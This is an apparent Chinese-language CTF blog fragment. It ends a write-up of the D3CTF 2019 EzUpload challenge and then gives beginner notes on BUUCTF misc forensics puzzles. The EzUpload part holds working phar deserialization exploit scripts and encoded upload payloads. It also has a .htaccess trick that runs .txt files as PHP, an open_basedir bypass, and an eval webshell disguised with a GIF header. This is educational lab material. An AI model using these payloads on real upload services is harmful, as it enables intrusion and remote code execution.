class="line">生成phar之后，怎么上传呢？</span><br></pre></td></tr></table></figure><p>file_get_contents方法，可利用的协议多了，这里使用data:，需要先把phar转成base64。（这里的filename自由设置即可，这里后缀.par，仅为了方便识别，无其他含义）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=upload&amp;url=data%3Atext%2Fhtml%3Bbase64%2CICAgIF9fSEFMVF9DT01QSUxFUigpOyA%2FPg0KsgAAAAEAAAARAAAAAQAAAAAAfAAAAE86MzoiZGlyIjozOntzOjc6InVzZXJkaXIiO086MzoiZGlyIjozOntzOjc6InVzZXJkaXIiO3M6MzoiLi4vIjtzOjM6InVybCI7TjtzOjg6ImZpbGVuYW1lIjtOO31zOjM6InVybCI7TjtzOjg6ImZpbGVuYW1lIjtOO30IAAAAdGVzdC50eHQEAAAA1g4%2FYgQAAAAMfn%2FYtgEAAAAAAAB0ZXN0zBKhl8baGNtTKvs9g%2B68fmyQgBgCAAAAR0JNQg&amp;filename=uppwd.par&amp;dir=</span><br></pre></td></tr></table></figure><p>上传<br><img src="/2022/03/26/BUUCTF-WEB-D3CTF-2019-EzUpload-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-htaccess-open-basdir%E7%BB%95%E8%BF%87/2022-03-26-23-40-31.png"><br>然后访问触发</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=upload&amp;url=phar://upload/cc551ab005b2e60fbdc88de809b2c4b1/uppwd.par&amp;filename=1&amp;dir=</span><br></pre></td></tr></table></figure><p><img src="/2022/03/26/BUUCTF-WEB-D3CTF-2019-EzUpload-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-htaccess-open-basdir%E7%BB%95%E8%BF%87/2022-03-26-23-41-23.png"><br>得到上级目录</p><h4 id="准备上传downpwd-par，用于查看本级目录"><a href="#准备上传downpwd-par，用于查看本级目录" class="headerlink" title="准备上传downpwd.par，用于查看本级目录"></a>准备上传downpwd.par，用于查看本级目录</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">#phar_gen.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$userdir</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;downpwd.phar&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">dir</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">dir</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;userdir=<span class="string">&quot;./upload/cc551ab005b2e60fbdc88de809b2c4b1&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;userdir=<span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test2.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;__HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$b</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=upload&amp;url=data%3Atext%2Fhtml%3Bbase64%2CX19IQUxUX0NPTVBJTEVSKCk7ID8%2BDQrZAAAAAQAAABEAAAABAAAAAACjAAAATzozOiJkaXIiOjM6e3M6NzoidXNlcmRpciI7TzozOiJkaXIiOjM6e3M6NzoidXNlcmRpciI7czo0MToiLi91cGxvYWQvY2M1NTFhYjAwNWIyZTYwZmJkYzg4ZGU4MDliMmM0YjEiO3M6MzoidXJsIjtOO3M6ODoiZmlsZW5hbWUiO047fXM6MzoidXJsIjtOO3M6ODoiZmlsZW5hbWUiO047fQgAAAB0ZXN0LnR4dAQAAACGET9iBAAAAAx%2Bf9i2AQAAAAAAAHRlc3TSbTpovuwwPh8TbCUNrImseECwagIAAABHQk1C&amp;filename=downpwd.par&amp;dir=</span><br></pre></td></tr></table></figure><p><img src="/2022/03/26/BUUCTF-WEB-D3CTF-2019-EzUpload-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-htaccess-open-basdir%E7%BB%95%E8%BF%87/2022-03-26-23-47-54.png"></p><p>访问触发</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=upload&amp;url=phar://upload/cc551ab005b2e60fbdc88de809b2c4b1/downwd.par&amp;filename=1&amp;dir=</span><br></pre></td></tr></table></figure><p>这里看到一些测试用的文件名<br><img src="/2022/03/26/BUUCTF-WEB-D3CTF-2019-EzUpload-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-htaccess-open-basdir%E7%BB%95%E8%BF%87/2022-03-26-23-48-29.png"></p><h4 id="读取本级目录，写入filename"><a href="#读取本级目录，写入filename" class="headerlink" title="读取本级目录，写入filename"></a>读取本级目录，写入filename</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$userdir</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test4.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;    __HALT_COMPILER(); &quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">   <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">dir</span>();</span><br><span class="line">   <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">dir</span>();</span><br><span class="line">   <span class="variable">$a</span>-&gt;userdir=<span class="string">&#x27;./upload/cc551ab005b2e60fbdc88de809b2c4b1&#x27;</span>;</span><br><span class="line">   <span class="variable">$o</span>-&gt;userdir=<span class="variable">$a</span>;</span><br><span class="line">   <span class="variable">$o</span>-&gt;filename=<span class="string">&#x27;/var/www/html/7c4e2c89a4054ce7/upload/cc551ab005b2e60fbdc88de809b2c4b1/webshell&#x27;</span>;<span class="comment">//这里要写绝对路径的原因是触发结构函数后的相对路径是根目录</span></span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上传之后，会把带有木马文件名的整个同级目录都写到webshell.txt里面，进而写入成功。</p><p>攻击基本成功，如何利用到txt文件呢，上传.htaccess，把txt也当作php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=upload&amp;filename=.htaccess&amp;url=data:image/png;base64,QWRkSGFuZGxlciBwaHA3LXNjcmlwdCAudHh0</span><br></pre></td></tr></table></figure><p>然后访问发现不行，猜测是限制了，重新上传phpinfo()文件名文件，发现限制system，所以使用open_basdir绕过</p><p>查看目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));</span><br></pre></td></tr></table></figure><p><img src="/2022/03/26/BUUCTF-WEB-D3CTF-2019-EzUpload-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-htaccess-open-basdir%E7%BB%95%E8%BF%87/2022-03-26-23-57-01.png"></p><p>查看文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/F1aG_1s_H4r4&#x27;</span>));</span><br></pre></td></tr></table></figure><p>得到flag</p><p>这里贴一个解法，好像是官方解，满巧妙的不用写入木马文件名了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$userdir</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;userdir = <span class="string">&#x27;&lt;?php eval($_GET[cmd]);?&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="string">&quot;/var/www/html/216cbd05fb1918ba/upload/4f105b2c0ec2da14aae9b130ee13f8e9/somnus&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;url = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">dir</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$d</span>));</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;somnus3.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89A&quot;</span>.<span class="string">&quot;__HALT_COMPILER();&quot;</span>); <span class="comment">//设置stub，增加gif文件头用以欺骗检测</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$d</span>); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.jpg&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://www.jianshu.com/p/4bf8614fb944">[D3CTF 2019]EzUpload</a><br><a href="https://www.freebuf.com/articles/web/264740.html">详谈CTF中常出现的PHP反序列化漏洞</a><br><a href="https://silente.top/archives/d3ctf-2019-ezupload/">D3CTF 2019 ezupload</a><br><a href="https://guokeya.github.io/post/x5o3GMTlC/">[D3CTF 2019]EzUpload(phar反序列化&#x2F;.htaccess+phar关键字绕过)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-MISIC-刷题笔记 01</title>
      <link href="/2022/03/24/BUUCTF-MISIC-%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-01/"/>
      <url>/2022/03/24/BUUCTF-MISIC-%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-01/</url>
      
        <content type="html"><![CDATA[<h2 id="题目-金三胖"><a href="#题目-金三胖" class="headerlink" title="题目-金三胖"></a>题目-金三胖</h2><p>一个gif，使用wps保存所有帧即可</p><h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><p>扫一下，secret is here ,然后用winhex打开看一下<br><img src="/2022/03/24/BUUCTF-MISIC-%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-01/2022-03-24-19-24-39.png"><br>这里就写个脚本吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">filename=sys.argv[<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;usage:poc.py -f XXX&#x27;</span>)</span><br><span class="line">png = <span class="built_in">open</span>(filename,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">a = png.read()</span><br><span class="line">png.close()</span><br><span class="line">hexstr = binascii.b2a_hex(a)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;504b0304&#x27;</span> <span class="keyword">in</span> hexstr:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;zip!&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;can&#x27;t dis&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h2><p>winhex打开，flag在文件尾</p><h2 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h2><p>winhex打开，base64解码，去除无用文件头，只保留png文件头即 <code>89 50 4e 47</code><br>然后，得到一张png图片，识别即可<br>识别二维码，得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zxing</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;poc.py -f filename&#x27;</span>)</span><br><span class="line">filename=sys.argv[<span class="number">2</span>]</span><br><span class="line">reader = zxing.BarCodeReader()</span><br><span class="line">barcode = reader.decode(filename)</span><br><span class="line"><span class="built_in">print</span>(barcode.parsed)</span><br></pre></td></tr></table></figure><h2 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h2><p>根据提示修改图片高度宽度，123分别代表 宽、高、以及IHDR的crc，更改高度即可<br><img src="/2022/03/24/BUUCTF-MISIC-%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-01/2022-03-24-21-44-27.png"><br>参考：<br><a href="https://blog.mythsman.com/post/5d2d62b4a2005d74040ef7eb/#--7">PNG文件格式详解</a><br><a href="https://www.jianshu.com/p/4d8cace82028">PNG、JPEG、BMP等几种图片格式详解（一）—— PNG</a><br><a href="https://blog.csdn.net/Cony_14/article/details/102761808">Python3 PNG文件格式及根据CRC检验码修复图片高度</a></p><h2 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h2><p>advanced爆破<br>base64</p><h2 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h2><p>winhex打开，搜索‘flag’</p><h2 id="文件中的秘密"><a href="#文件中的秘密" class="headerlink" title="文件中的秘密"></a>文件中的秘密</h2><p>文件属性，详细信息，备注</p><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><p>user password 一般是post传参，直接条件搜索 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method==POST</span><br></pre></td></tr></table></figure><p>拿到flag</p><h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><p>Stegsolve打开，下载地址 <a href="http://www.caesum.com/handbook/Stegsolve.jar">http://www.caesum.com/handbook/Stegsolve.jar</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">打开</span><br><span class="line">java -jar Stegsolve.jar</span><br></pre></td></tr></table></figure><p>导入文件后，发现   </p><p><img src="/2022/03/24/BUUCTF-MISIC-%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-01/2022-03-24-22-32-26.png"><br><img src="/2022/03/24/BUUCTF-MISIC-%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-01/2022-03-24-22-32-50.png"><br><img src="/2022/03/24/BUUCTF-MISIC-%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-01/2022-03-24-22-33-18.png">  </p><p>然后extra data，调制如下，sava bin，打开是一个二维码，扫描即可</p><p><img src="/2022/03/24/BUUCTF-MISIC-%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-01/2022-03-24-22-35-03.png"></p><h2 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h2><p>advanced爆破</p><h2 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h2><p>zip文件 组成<br>压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">压缩源文件数据区：</span><br><span class="line">50 4B 03 04：这是头文件标记（0x04034b50）</span><br><span class="line">14 00：解压文件所需 pkware 版本</span><br><span class="line">00 00：全局方式位标记（有无加密，奇数加密，偶数无加密）</span><br><span class="line">08 00：压缩方式</span><br><span class="line">5A 7E：最后修改文件时间</span><br><span class="line">F7 46：最后修改文件日期</span><br><span class="line">16 B5 80 14：CRC-32校验（1480B516）</span><br><span class="line">19 00 00 00：压缩后尺寸（25）</span><br><span class="line">17 00 00 00：未压缩尺寸（23）</span><br><span class="line">07 00：文件名长度</span><br><span class="line">00 00：扩展记录长度</span><br><span class="line"></span><br><span class="line">压缩源文件目录区:</span><br><span class="line">50 4B 01 02：目录中文件文件头标记(0x02014b50)</span><br><span class="line">3F 00：压缩使用的 pkware 版本</span><br><span class="line">14 00：解压文件所需 pkware 版本</span><br><span class="line">00 00：全局方式位标记（有无加密，奇数加密，偶数无加密）</span><br><span class="line">08 00：压缩方式</span><br><span class="line">5A 7E：最后修改文件时间</span><br><span class="line">F7 46：最后修改文件日期</span><br><span class="line">16 B5 80 14：CRC-32校验（1480B516）</span><br><span class="line">19 00 00 00：压缩后尺寸（25）</span><br><span class="line">17 00 00 00：未压缩尺寸（23）</span><br><span class="line">07 00：文件名长度</span><br><span class="line">24 00：扩展字段长度</span><br><span class="line">00 00：文件注释长度</span><br><span class="line">00 00：磁盘开始号</span><br><span class="line">00 00：内部文件属性</span><br><span class="line">20 00 00 00：外部文件属性</span><br><span class="line">00 00 00 00：局部头部偏移量</span><br><span class="line"></span><br><span class="line">压缩源文件目录结束标志:</span><br><span class="line">50 4B 05 06：目录结束标记</span><br><span class="line">00 00：当前磁盘编号</span><br><span class="line">00 00：目录区开始磁盘编号</span><br><span class="line">01 00：本磁盘上纪录总数</span><br><span class="line">01 00：目录区中纪录总数</span><br><span class="line">59 00 00 00：目录区尺寸大小</span><br><span class="line">3E 00 00 00：目录区对第一张磁盘的偏移量</span><br><span class="line">00 00 1A：ZIP 文件注释长度</span><br></pre></td></tr></table></figure><p>把两个加密标志位改为 00 即可</p><p>参考：</p><p><a href="https://blog.csdn.net/MikeCoke/article/details/105877451">BUUCTF ZIP伪加密</a></p><h2 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h2><p>扫描即可<br>线上扫描<br><a href="https://cli.im/deqr">二维码解码器</a></p><h2 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h2><p>查找规则 http<br>然后再post上传图片里发现flag<br><img src="/2022/03/24/BUUCTF-MISIC-%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-01/2022-03-24-23-05-05.png"></p><h2 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h2><p>Stegsolve</p><p><img src="/2022/03/24/BUUCTF-MISIC-%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-01/2022-03-24-23-10-56.png"><br>保存后放进winhex</p><p><img src="/2022/03/24/BUUCTF-MISIC-%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-01/2022-03-24-23-11-36.png"></p><h2 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h2><p>binwalk检查  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e filename</span><br><span class="line">advanced</span><br></pre></td></tr></table></figure><h2 id="小明的保险箱"><a href="#小明的保险箱" class="headerlink" title="小明的保险箱"></a>小明的保险箱</h2><p>binwalk检查  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e filename</span><br><span class="line">advanced</span><br></pre></td></tr></table></figure><h2 id="爱因斯坦"><a href="#爱因斯坦" class="headerlink" title="爱因斯坦"></a>爱因斯坦</h2><p>右键-R，详细信息看到<br>this_is_not_password<br>binwalk检查解压<br>用this_is_not_password解密即可</p><h2 id="easycap"><a href="#easycap" class="headerlink" title="easycap"></a>easycap</h2><p>TCP追踪流</p><h2 id="隐藏的钥匙"><a href="#隐藏的钥匙" class="headerlink" title="隐藏的钥匙"></a>隐藏的钥匙</h2><p>winhex 搜索flag</p><h2 id="另外一个世界"><a href="#另外一个世界" class="headerlink" title="另外一个世界"></a>另外一个世界</h2><p>winhex 发现二进制，转成ascii即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">二进制、字符串转换</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_2_bin</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">bin</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">str</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bin_2_str</span>(<span class="params"><span class="built_in">bin</span></span>):</span><br><span class="line">    tmp=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    choose=<span class="number">8</span></span><br><span class="line">    choose=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;input your choose 8/16. Default=8\ninput:&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span 